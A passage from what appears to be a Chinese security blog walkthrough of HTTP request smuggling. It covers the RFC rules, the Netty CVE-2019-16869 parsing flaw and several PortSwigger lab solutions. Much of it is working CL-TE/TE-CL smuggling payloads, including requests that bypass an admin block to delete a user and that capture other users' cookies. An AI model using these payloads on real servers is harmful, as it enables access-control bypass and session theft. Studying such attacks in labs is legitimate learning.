CL</h2><p>RFC7230 3.3.2中：</p><blockquote><p>如果接收到的消息具有多个 Content-Length 标头字段，其字段值由相同的十进制值组成，或单个 Content-Length 标头字段的字段值包含相同十进制值的列表（例如，“Content-Length : 42, 42”)，表示重复的 Content-Length 标头字段已由上游消息处理器生成或组合，那么接收者必须要么拒绝消息为无效，要么用单个有效的 Content-Length 替换重复的字段值 在确定消息正文长度或转发消息之前包含该十进制值的字段。</p></blockquote><p>3.3.3中：</p><blockquote><p>如果接收到的消息没有 Transfer-Encoding 并且具有多个具有不同字段值的 Content-Length 标头字段或具有无效值的单个 Content-Length 标头字段，则消息帧无效并且接收者必须将其视为 不可恢复的错误。 如果这是一个请求消息，服务器必须以 400（错误请求）状态码响应，然后关闭连接。</p></blockquote><p>例子：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET /suzann.html HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com\r\n</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>0\r\n</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>46\r\n</span><br><span class="line">\r\n</span><br><span class="line">GET /walter.html HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>example.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>假设：如果Front以第二个CL作为解析标准，并且Backend以第一个CL作为解析标准，这样就在http请求中注入了一个http请求。</p><h2 id="optional-whitespace">Optional WhiteSpace</h2><p>RFC7230中：</p><blockquote><p>3.2. 标题字段</p><p>每个标头字段由不区分大小写的字段名称后跟冒号 (":")、可选的前导空格、字段值和可选的尾随空格组成。</p><p>header-field = field-name “:” OWS 字段值 OWS</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">field-name     = token</span><br><span class="line">field-value    = *( field-content / obs-fold )</span><br><span class="line">field-content  = field-vchar [ <span class="number">1</span>*( SP / HTAB ) field-vchar ]</span><br><span class="line">field-vchar    = VCHAR / obs-text</span><br><span class="line"></span><br><span class="line">obs-fold       = CRLF <span class="number">1</span>*( SP / HTAB )</span><br><span class="line">               ; obsolete line folding</span><br><span class="line">               ; see Section <span class="number">3.2</span><span class="number">.4</span></span><br></pre></td></tr></table></figure><p>字段后面应该紧跟<code>:</code>冒号，然后是 <code>OWS(Optional WhiteSpace)</code> 可选的空格，然后再是字段值，最后是 OWS 可选空格。</p><p>如果中间件对于上面的实现没有严格遵守RFC的话，也可能会造成http请求走私。</p><p>经典的例子是CVE-2019-16869，是Netty中间件存在的http Smuggling漏洞。</p><p>关键代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (nameEnd = nameStart; nameEnd &lt; length; nameEnd ++) &#123;</span><br><span class="line">  <span class="keyword">char</span> ch = sb.charAt(nameEnd);</span><br><span class="line">  <span class="keyword">if</span> (ch == <span class="string">&#x27;:&#x27;</span> || Character.isWhitespace(ch)) &#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里将空格与冒号同样处理了，没有抛出错误或其他工作，与RFC不一致，会产生解析差异。</p><p><code>@Bi3g0</code>构建了比较清晰的漏洞原理图：</p><p><img src="/2022/10/05/2022-10-HTTP/65211134-3e03cd00-dad0-11e9-94a5-b9f04ea18f38.png"></p><p>其中的ELB为Front服务器，Netty为Backend服务器，发送如下请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/getusers</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.backend.com</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>64</span><br><span class="line">Transfer-Encoding : chunked</span><br><span class="line"></span><br><span class="line"><span class="vbnet"><span class="number">0</span></span></span><br><span class="line"><span class="vbnet"></span></span><br><span class="line"><span class="vbnet"><span class="keyword">GET</span> /hacker HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="vbnet"><span class="symbol">Host:</span> www.hacker.com</span></span><br><span class="line"><span class="vbnet"><span class="symbol">hacker:</span> hacker</span></span><br></pre></td></tr></table></figure><p>ELB服务器会将Transfer-Encoding字段丢弃，因为其不符合RFC规范，继续使用CL，将上述扔给Netty，Netty优先TE解析，也就是说会当做两个请求，故而造成http请求走私，</p><h2 id="cl-te">CL-TE</h2><p>接下来的几个实验都是使用<code>@portswigger</code>提供的Lab ：<a href="https://portswigger.net/web-security/request-smuggling">HTTP request smuggling</a></p><p>开始前记得把burp的CL更新关掉</p><figure><img src="/2022/10/05/2022-10-HTTP/image-20221005190051100.png" alt="image-20221005190051100"><figcaption aria-hidden="true">image-20221005190051100</figcaption></figure><p><a href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te">Lab: HTTP request smuggling, basic CL.TE vulnerability</a></p><blockquote><p>本实验涉及前端和后端服务器，前端服务器不支持分块编码。 前端服务器拒绝不使用 GET 或 POST 方法的请求。</p><p>解决实验室，偷偷向后端服务器发送一个请求，让后端服务器处理的下一个请求出现使用GPOST方法。</p></blockquote><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a5f0013044e0a8dc0c33f2c00850080.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>8</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">G</span><br></pre></td></tr></table></figure><figure><img src="/2022/10/05/2022-10-HTTP/image-20221006172502463.png" alt="image-20221006172502463"><figcaption aria-hidden="true">image-20221006172502463</figcaption></figure><figure><img src="/2022/10/05/2022-10-HTTP/image-20221006172519759.png" alt="image-20221006172519759"><figcaption aria-hidden="true">image-20221006172519759</figcaption></figure><p>这样第二次就构造出GPOST的http 方法了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">User            Front           Backend</span><br><span class="line">|               |               |</span><br><span class="line">|--A(1A+1/2B)--&gt;|               | </span><br><span class="line">|               |--A(1A+1/2B)--&gt;| </span><br><span class="line">|               |&lt;-A(200)-------|</span><br><span class="line">|               |            [1/2B]</span><br><span class="line">|&lt;-A(200)-------|            [1/2B]</span><br><span class="line">|--C-----------&gt;|            [1/2B]</span><br><span class="line">|               |--C-----------&gt;| * ending B *</span><br><span class="line">|               |&lt;--B(200)------|</span><br><span class="line">|&lt;--B(200)------|               |</span><br></pre></td></tr></table></figure><ul><li>1A + 1/2B 表示的是一个完整的请求 A + 一个不完整的请求 B</li><li>A(X) : 表示 X 请求隐藏在 A 请求的 body 当中</li><li>ending B: 请求 C 第一行被拼接到了不完整的请求 B 的 header 头当中，请求 C 其他所有的请求头都被添加到了请求 B 当中，这样请求 C 就相当于消失了，请求 B 会带着请求 C 的请求头去请求后段服务器，包括 Cookie 字段或者其他什么认证字段</li></ul><p>整个过程：首先发送请求，Front服务器优先CL处理，那么会认为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0\r\n</span><br><span class="line">\r\n</span><br><span class="line">G</span><br></pre></td></tr></table></figure><p>为一个完整请求，到Backend服务器时，优先TE处理，会认为：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a5f0013044e0a8dc0c33f2c00850080.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>8</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>是一个完整请求，而认为<code>G</code>是一个不完整的请求，造成了1/2B请求，之后与后面的C请求构成一个完整的请求，而造成<code>GPOST</code>请求</p><h2 id="te-cl">TE-CL</h2><p>还是使用Lab：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl">Lab: HTTP request smuggling, basic TE.CL vulnerability</a></p><blockquote><p>本实验涉及前端和后端服务器，后端服务器不支持分块编码。 前端服务器拒绝不使用 GET 或 POST 方法的请求。</p><p>解决实验室，偷偷向后端服务器发送一个请求，让后端服务器处理的下一个请求出现使用GPOST方法。</p></blockquote><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a7a00370308efe7c0a4cbb400f500a9.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="awk"><span class="number">12</span></span></span><br><span class="line"><span class="awk">GPOST <span class="regexp">/ HTTP/</span><span class="number">1.1</span></span></span><br><span class="line"><span class="awk"></span></span><br><span class="line"><span class="awk"><span class="number">0</span></span></span><br><span class="line"><span class="awk"></span></span><br><span class="line"><span class="awk"></span></span><br><span class="line"><span class="awk"><span class="regexp">//</span>这里需要注意，有两个CRLF：</span></span><br><span class="line"><span class="awk"><span class="number">0</span>\r\n</span></span><br><span class="line"><span class="awk">\r\n</span></span><br></pre></td></tr></table></figure><p><img src="/2022/10/05/2022-10-HTTP/image-20221006174616570.png"></p><p>流程与CL-TE相同，Front服务器处理的时候会TE优先处理，认为是一个请求，Backend服务器处理的时候会认为上面是两个请求（CL优先处理），造成GPOST请求。</p><h2 id="two-identical-fields---te">Two Identical Fields - TE</h2><p>LAB：<a href="https://portswigger.net/web-security/request-smuggling/lab-ofuscating-te-header">Lab: HTTP request smuggling, obfuscating the TE header</a></p><blockquote><p>本实验涉及前端和后端服务器，这两个服务器以不同的方式处理重复的 HTTP 请求标头。 前端服务器拒绝不使用 GET 或 POST 方法的请求。</p><p>解决实验室，偷偷向后端服务器发送一个请求，让后端服务器处理的下一个请求出现使用GPOST方法。</p></blockquote><p>此场景是一个TE-TE场景，比如说在处理两个 TE 字段，如果取第二个 TE 字段作为解析标准，而第二个字段值非正常或者解析出错，就可能会忽略掉 TE 字段，而使用 CL 字段进行解析，之后成为CL-TE。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0abb002603fd1939c0ecec4600b8000a.web-security-academy.net</span><br><span class="line"><span class="attribute">Content-length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">Transfer-encoding</span><span class="punctuation">: </span>nothing</span><br><span class="line"></span><br><span class="line"><span class="awk"><span class="number">12</span></span></span><br><span class="line"><span class="awk">GPOST <span class="regexp">/ HTTP/</span><span class="number">1.1</span></span></span><br><span class="line"><span class="awk"></span></span><br><span class="line"><span class="awk"><span class="number">0</span></span></span><br><span class="line"><span class="awk"></span></span><br><span class="line"><span class="awk"><span class="regexp">//</span>这里和上面的一样，<span class="number">0</span>后面有两个CRLF</span></span><br></pre></td></tr></table></figure><p>发送两次如上请求：</p><figure><img src="/2022/10/05/2022-10-HTTP/image-20221006175542093.png" alt="image-20221006175542093"><figcaption aria-hidden="true">image-20221006175542093</figcaption></figure><p>Front服务器处理时对第一个TE处理，认为是正常请求，给Backend服务器，Backend以第二个TE处理，非正常，使用CL处理，之后被拆分为两个请求。</p><h1 id="attack-surface">Attack Surface</h1><p>上面是几种常见的攻击方式，下面来演示这些攻击方式可以用来干嘛</p><h2 id="bypass-front-end-security-controls">Bypass Front-end Security Controls</h2><p>两个lab，一个是CL-TE，一个是TE-CL，达到的目的一样：</p><ul><li><a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te">Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability</a></li><li><a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl">Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability</a></li></ul><blockquote><p>本实验涉及前端和后端服务器，前端服务器不支持分块编码。 /admin 有一个管理面板，但前端服务器阻止访问它。</p><p>要解决实验室问题，请向访问管理面板并删除用户 carlos 的后端服务器发送请求。</p></blockquote><p>这个lab是使用admin删除carlos用户。</p><p>直接访问<code>/admin</code>的话会显示：<code>"Path /admin is blocked"</code></p><p>这里我选择的是CL-TE，发送如下请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a8600f1034842adc0f77d2e00360034.web-security-academy.net</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=FSDE0lrTI1tuBNQJt4RSqapGBCHSKent</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>30</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="apache"></span></span><br><span class="line"><span class="apache"><span class="attribute">GET</span> /admin HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="apache"></span></span><br><span class="line"><span class="apache"></span></span><br></pre></td></tr></table></figure><p>发送两次后：</p><figure><img src="/2022/10/05/2022-10-HTTP/image-20221007000035006.png" alt="image-20221007000035006"><figcaption aria-hidden="true">image-20221007000035006</figcaption></figure><p>添加host头，在发送几次：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a8600f1034842adc0f77d2e00360034.web-security-academy.net</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=FSDE0lrTI1tuBNQJt4RSqapGBCHSKent</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>45</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="apache"></span></span><br><span class="line"><span class="apache"><span class="attribute">GET</span> /admin HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="apache"><span class="attribute">Host</span>: localhost</span></span><br><span class="line"><span class="apache"></span></span><br></pre></td></tr></table></figure><figure><img src="/2022/10/05/2022-10-HTTP/image-20221007000338001.png" alt="image-20221007000338001"><figcaption aria-hidden="true">image-20221007000338001</figcaption></figure><p>得到了删除用户的api，直接：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a8600f1034842adc0f77d2e00360034.web-security-academy.net</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=FSDE0lrTI1tuBNQJt4RSqapGBCHSKent</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>63</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="routeros">0</span></span><br><span class="line"><span class="routeros"></span></span><br><span class="line"><span class="routeros"><span class="builtin-name">GET</span> /admin/delete?<span class="attribute">username</span>=carlos HTTP/1.1</span></span><br><span class="line"><span class="routeros">Host: localhost</span></span><br><span class="line"><span class="routeros"></span></span><br><span class="line"><span class="routeros"></span></span><br></pre></td></tr></table></figure><p>即可，</p><p><img src="/2022/10/05/2022-10-HTTP/20191123155603.png" alt="img">需要注意的就是注意控制CL长度</p><h2 id="revealing-front-end-request-rewriting">Revealing Front-end Request Rewriting</h2><p>有的Front服务器接收到请求后并不会直接给Backend服务器，而是会加一些头部，比如：</p><ul><li>描述TLS连接所使用的协议和密码</li><li>包含用户IP地址的XFF头</li><li>用户的会话令牌ID</li></ul><p>意思就是，如果不能知道Front服务器添加了哪些字段，即使走私过去了请求也并不能正确执行，<code>PortSwigger</code>提供了获取这些字段的方法，主要是三步：</p><ol type="1"><li>找一个能够将请求参数的值输出到响应中的POST请求</li><li>把该POST请求中，找到的这个特殊的参数放在消息的最后面</li><li>然后走私这一个请求，然后直接发送一个普通的请求，前端服务器对这个请求重写的一些字段就会显示出来。</li></ol><p>Lab：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting">Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting</a></p><blockquote><p>本实验涉及前端和后端服务器，前端服务器不支持分块编码。</p><p>/admin 有一个管理面板，但只有 IP 地址为 127.0.0.1 的人才能访问它。 前端服务器将 HTTP 标头添加到包含其 IP 地址的传入请求。 它类似于 X-Forwarded-For 标头，但名称不同。</p><p>为了解决实验室问题，向后端服务器发送一个请求，该请求会显示前端服务器添加的标头。 然后向后端服务器发送一个包含添加的标头的请求，访问管理面板并删除用户 carlos。</p></blockquote><p>这个lab是CL-TE场景，先简单尝试下提示需要请求里包含来源，</p><figure><img src="/2022/10/05/2022-10-HTTP/image-20221007163329968.png" alt="image-20221007163329968"><figcaption aria-hidden="true">image-20221007163329968</figcaption></figure><p>利用搜索回显把请求头泄露出来：</p><figure><img src="/2022/10/05/2022-10-HTTP/image-20221007163910172.png" alt="image-20221007163910172"><figcaption aria-hidden="true">image-20221007163910172</figcaption></figure><p>可以看到请求头：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-JVXlnc-Ip</span><span class="punctuation">: </span>218.199.185.111</span><br></pre></td></tr></table></figure><p>可以看到删除用户的API了：</p><figure><img src="/2022/10/05/2022-10-HTTP/image-20221007164152181.png" alt="image-20221007164152181"><figcaption aria-hidden="true">image-20221007164152181</figcaption></figure><p>跟上面的一样，成功删除：</p><figure><img src="/2022/10/05/2022-10-HTTP/image-20221007164443828.png" alt="image-20221007164443828"><figcaption aria-hidden="true">image-20221007164443828</figcaption></figure><blockquote><p>注意：如果你不添加 Content-Type 字段的话，需要在最后添加一个<code>\r\n</code>，否则会返回 400</p></blockquote><h2 id="capturing-other-users-requests">Capturing other users’ requests</h2><p>既然可以拿到中间件的请求，那么也可以拿到其他用户的请求，cookie等。</p><p>Lab：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests">Lab: Exploiting HTTP request smuggling to capture other users’ requests</a></p><blockquote><p>本实验涉及前端和后端服务器，前端服务器不支持分块编码。</p><p>为了解决实验室问题，将请求偷运到后端服务器，导致下一个用户的请求存储在应用程序中。 然后检索下一个用户的请求并使用受害者用户的 cookie 访问他们的帐户。</p></blockquote><p>找到个发评论的地方进行HTTP请求走私：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a4700a603f0e3c0c0bc8d6c0007009b.web-security-academy.net</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=TJoTuRZfJ7lo34B90Qx38aS4mnL19b87</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>270</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="apache"></span></span><br><span class="line"><span class="apache"><span class="attribute">POST</span> /post/comment HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="apache"><span class="attribute">Content</span>-Length: <span class="number">600</span></span></span><br><span class="line"><span class="apache"><span class="attribute">Content</span>-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="apache"><span class="attribute">Cookie</span>: session=TJoTuRZfJ<span class="number">7</span>lo<span class="number">34</span>B<span class="number">90</span>Qx<span class="number">38</span>aS<span class="number">4</span>mnL<span class="number">19</span>b<span class="number">87</span></span></span><br><span class="line"><span class="apache"></span></span><br><span class="line"><span class="apache"><span class="attribute">csrf</span>=T<span class="number">7</span>b<span class="number">6</span>sV<span class="number">5</span>RKZSljTWkHQlZ<span class="number">5</span>CqpA<span class="number">3</span>AoLkhg&amp;postId=<span class="number">8</span>&amp;name=<span class="number">2</span>&amp;email=<span class="number">1</span>%<span class="number">4011</span>.com&amp;website=http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>Fwww.baidu.com&amp;comment=</span></span><br></pre></td></tr></table></figure><p>就可以得到：</p><figure><img src="/2022/10/05/2022-10-HTTP/image-20221007231347789.png" alt="image-20221007231347789"><figcaption aria-hidden="true">image-20221007231347789</figcaption></figure><p>试了一晚上，还是没有完整的泄露出来，，可能是不够长？？？但是太长总提示超时，，，</p><h2 id="exploit-reflected-xss">Exploit Reflected XSS</h2><p>这个场景比较少见，利用也有受限。同样，如果有，可以拿到别人的cookie。</p><p>lab：https://portswigger.net/web-security/request-smuggling/exploiting/lab-deliver-reflected-xss</p><p>还是CL-TE：</p><blockquote><p>本实验涉及前端和后端服务器，前端服务器不支持分块编码。</p><p>该应用程序还容易受到通过 User-Agent 标头反射的 XSS 的攻击。</p><p>为了解决实验室问题，将请求偷运到后端服务器，导致下一个用户的请求接收包含执行 alert(1) 的 XSS 漏洞的响应。</p></blockquote><p>UA的地方可以xss：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>0a1700880449444fc029034c00a000a0.web-security-academy.net</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=UlNKTSZflefPZc6kewaDGpemn7Isi5I0</span><br><span class="line"><span 